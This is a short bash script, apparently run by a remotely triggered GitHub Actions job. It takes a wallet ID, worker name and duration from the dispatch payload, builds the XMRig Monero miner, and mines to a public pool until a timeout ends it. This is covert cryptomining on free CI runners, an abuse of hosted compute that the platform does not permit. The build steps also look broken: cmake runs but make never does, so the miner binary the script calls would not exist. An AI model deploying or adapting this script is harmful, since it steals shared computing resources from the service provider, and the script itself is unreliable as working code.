#!/bin/bash

# api变量解析
# ./tmp/curlauto.sh kukutt token actions xmrig '{"xmrigid": "xxxxxxxx", "xmrigname": "gt000", "sleeptime": "3600"}'
jsxmrigid=`cat $GITHUB_EVENT_PATH | jq ".client_payload.xmrigid" | sed 's/\"//g'`
jsxmrigname=`cat $GITHUB_EVENT_PATH | jq ".client_payload.xmrigname" | sed 's/\"//g'`
jssleeptime=`cat $GITHUB_EVENT_PATH | jq ".client_payload.sleeptime" | sed 's/\"//g'`

echo $jsxmrigid $jsxmrigname $jssleeptime

git clone https://github.com/xmrig/xmrig.git
[ -n "$LOCALTEST" ] || sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
[ -n "$LOCALTEST" ] || sudo apt-get install automake libtool autoconf -y
cd xmrig
mkdir -p build
cd build
cmake ../
./xmrig --help
timeout $jssleeptime ./xmrig -o xmr.pool.onepool.co:13531 -u $jsxmrigid:$jsxmrigname -p x -k
killall xmrig
